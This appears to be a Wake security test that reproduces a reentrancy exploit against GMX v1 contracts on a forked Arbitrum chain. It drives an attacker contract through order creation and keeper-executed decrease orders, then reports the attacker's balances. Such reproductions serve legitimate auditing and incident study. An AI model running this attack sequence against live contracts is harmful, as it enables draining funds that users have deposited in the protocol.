from wake.testing import *
from wake.testing import chain, Account, Address, uint256, uint8, uint32, on_revert, mint_erc20

# Core contracts
from pytypes.gmxcontracts.contracts.core.OrderBook import OrderBook
from pytypes.gmxcontracts.contracts.core.PositionManager import PositionManager
from pytypes.gmxcontracts.contracts.core.Vault import Vault
from pytypes.gmxcontracts.contracts.core.Router import Router
from pytypes.gmxcontracts.contracts.core.PositionRouter import PositionRouter
from pytypes.gmxcontracts.contracts.core.VaultPriceFeed import VaultPriceFeed
from pytypes.gmxcontracts.contracts.core.VaultUtils import VaultUtils
from pytypes.gmxcontracts.contracts.core.ShortsTracker import ShortsTracker
from pytypes.gmxcontracts.contracts.core.VaultErrorController import VaultErrorController

from pytypes.gmxcontracts.contracts.oracle.FastPriceFeed import FastPriceFeed
from pytypes.gmxcontracts.contracts.staking.RewardRouterV2 import RewardRouterV2
from pytypes.gmxcontracts.contracts.core.PositionUtils import PositionUtils
from pytypes.gmxcontracts.contracts.core.GlpManager import GlpManager

# Token contracts
from pytypes.gmxcontracts.contracts.tokens.USDG import USDG
from pytypes.gmxcontracts.contracts.gmx.GLP import GLP
from pytypes.gmxcontracts.contracts.peripherals.Timelock import Timelock
from pytypes.gmxcontracts.contracts.gmx.GMX import GMX
from pytypes.gmxcontracts.contracts.gmx.EsGMX import EsGMX
from pytypes.gmxcontracts.contracts.oracle.PriceFeed import IPriceFeed


from pytypes.tests.SimpleAttacker import SimpleAttacker

# Mock contracts

from pytypes.wake.interfaces.IERC20 import IERC20

from dotenv import load_dotenv
load_dotenv()
import os
import inspect

FORK_URL: str = os.environ.get("FORK_URL", "")
BLOCK_NUMBER: str = "355880230"

# Constants for deployment
FUNDING_RATE_FACTOR = 100  # 0.01% per hour
STABLE_FUNDING_RATE_FACTOR = 100
MIN_PROFIT_TIME = 0  # 0 seconds for testing

# Print failing tx call trace
def revert_handler(e):
    if e.tx is not None:
        print(e.tx.call_trace)
        print(e.tx.console_logs)

def tx_callback(tx: TransactionAbc):
    print(tx.call_trace)


def set_label(var: Account):
    # Get the calling frame
    current_frame = inspect.currentframe()
    if current_frame is not None:
        frame = current_frame.f_back
        # Look through local variables to find which one matches our object
        if frame is not None:
            for name, obj in frame.f_locals.items():
                if obj is var:
                    var.label = name
                    break





def function_init():
    weth = IERC20("0x82aF49447D8a07e3bd95BD0d56f35241523fBab1")
    wbtc = IERC20("0x2f2a2543b76a4166549f7aab2e75bef0aefc5b0f")
    usdc = IERC20("0xaf88d065e77c8cc2239327c5edb3a432268e5831")

    set_label(weth)
    set_label(wbtc)
    set_label(usdc)

    position_manager = PositionManager("0x75e42e6f01baf1d6022bea862a28774a9f8a4a0c")
    set_label(position_manager)

    order_book = OrderBook("0x09f77e8a13de9a35a7231028187e9fd5db8a2acb")
    set_label(order_book)

    vault = Vault("0x489ee077994b6658eafa855c308275ead8097c4a")
    set_label(vault)

    reward_router = RewardRouterV2("0xb95db5b167d75e6d04227cfffa61069348d271f5")
    set_label(reward_router)
    router = Router("0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064")
    set_label(router)

    glp = Account("0x4277f8f2c384827b5273592ff7cebd9f2c1ac258")
    set_label(glp)

    attacker_contract = chain.accounts[0]
    set_label(attacker_contract)
    tx_caller = chain.accounts[1]
    set_label(tx_caller)


    # mint_erc20(weth, tx_caller, weth_in)
    # weth.approve(order_book, weth_in, from_=tx_caller)

    # https://docs.chain.link/data-feeds/price-feeds/addresses?page=1&testnetPage=1&network=arbitrum&search=ETH/

    eth_usd_price_feed = IPriceFeed("0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612")
    set_label(eth_usd_price_feed)


    wbtc_usd_price_feed = IPriceFeed("0xd0C7101eACbB49F3deCcCc166d238410D6D46d57")
    set_label(wbtc_usd_price_feed)


    fast_price_feed = FastPriceFeed("0x11D62807dAE812a0F1571243460Bf94325F43BB7")
    set_label(fast_price_feed)

    glp_manager = GlpManager("0x3963FfC9dff443c2A94f21b129D429891E32ec18")
    set_label(glp_manager)
    short_tracker = ShortsTracker("0xf58eEc83Ba28ddd79390B9e90C4d3EbfF1d434da")
    set_label(short_tracker)

    vault_price_fees = VaultPriceFeed("0x2d68011bcA022ed0E474264145F46CC4de96a002")
    set_label(vault_price_fees)

    order_keeper = Account("0xd4266f8f82f7405429ee18559e548979d49160f3")
    set_label(order_keeper)



    return (
        weth,
        wbtc,
        usdc,
        position_manager,
        order_book,
        vault,
        reward_router,
        router,
        glp_manager,
        short_tracker,
        attacker_contract,
        tx_caller,
        eth_usd_price_feed,
        fast_price_feed,
        glp,
        vault_price_fees,
        order_keeper,
        wbtc_usd_price_feed
    )



@chain.connect(fork=f"{FORK_URL}@{BLOCK_NUMBER}")
@on_revert(revert_handler)
def test_long_order_reent():
    assert chain.blocks["latest"].number < 355880237
    (
        weth,
        wbtc,
        usdc,
        position_manager,
        order_book,
        vault,
        reward_router,
        router,
        glp_manager,
        short_tracker,
        attacker_contract,
        _,
        eth_usd_price_feed,
        fast_price_feed,
        glp,
        vault_price_fees,
        order_keeper,
        wbtc_usd_price_feed
    ) = function_init()

    # Error types from error code.
        # for i in range(60):
        #     print(f"Iteration {i}: {vault.errors(i)}")
    attacker = chain.accounts[4]
    attacker_contract = SimpleAttacker.deploy(glp_manager, vault, glp, reward_router, from_=attacker)

    min_exec_fee = order_book.minExecutionFee()

    attacker_contract.balance = 2 * 10**18

    weth_in = 10**18

    price = fast_price_feed.prices(weth) # decimals is 30

    # must be size is bigger
    size_delta = ((price * weth_in) // 10**18) * 110 // 100 # 1.1 times leverage


    tx = attacker_contract.execute(
        data=abi.encode_call(
            OrderBook.createIncreaseOrder,
            [[weth], weth_in, weth, 0, size_delta, weth, True, 0, True, min_exec_fee, True]
        ),
        value_=min_exec_fee+weth_in,
        target=order_book
    ) # 1*10**18 of weth + few fee as eth

    print(f"Use 1ether just for having a position")

    assert position_manager.isOrderKeeper(order_keeper)

    tx = attacker_contract.execute(
        data= abi.encode_call(Router.approvePlugin, [order_book]),
        value_=0,
        target=router
    )

    tx = position_manager.executeIncreaseOrder(
        _account=attacker_contract,
        _orderIndex=0,
        _feeReceiver=order_keeper,
        from_=order_keeper
    )


    # execute from attacker contract
    tx = attacker_contract.execute(
        data=abi.encode_call(
            OrderBook.createDecreaseOrder,
            [weth, size_delta, weth, 0, True, 0, True] # full close
        ),
        value_=order_book.minExecutionFee() + 1,
        target=order_book
    )

    amount_in = 1_000_000*10**6 # 1M usdc
    mint_for_reward_amount = 1_000_000 * 10**6  #1M usdc
    mint_erc20(usdc, attacker_contract, amount_in+mint_for_reward_amount) # 2M of usdc

    print(f"Use 1M usdc for increase position")
    print(f"Use 1M usdc for staking")



    collateral_delta = (amount_in * 10**30) // 10**6
    size_delta = (collateral_delta) * 800 // 100 # 8 times leverage position
    prev_aum = glp_manager.getAum(False)

    attacker_contract.set_size_delta(size_delta)

    print("-" * 5 + "Reentrancy call" + "-" * 5)

    tx = position_manager.executeDecreaseOrder(
        _account=attacker_contract,
        _orderIndex=0,
        _feeReceiver=order_keeper,
        from_=order_keeper
    )

    # print(tx.call_trace)
    print(tx.console_logs)

    print("-" * 10)


    print(f"wbtc balance {wbtc.balanceOf(attacker_contract)}")
    print(f"usdc balance {usdc.balanceOf(attacker_contract) / 10**6}")
    print(f"eth balance {attacker_contract.balance / 10**18}")

    print(f"wbtc in usd {wbtc.balanceOf(attacker_contract) * wbtc_usd_price_feed.latestAnswer() / 10**16}")
    print(f"usdc in usd {usdc.balanceOf(attacker_contract) / 10**6}")
    print(f"eth in usdc {attacker_contract.balance * eth_usd_price_feed.latestAnswer() / 10**(8 + 18) }")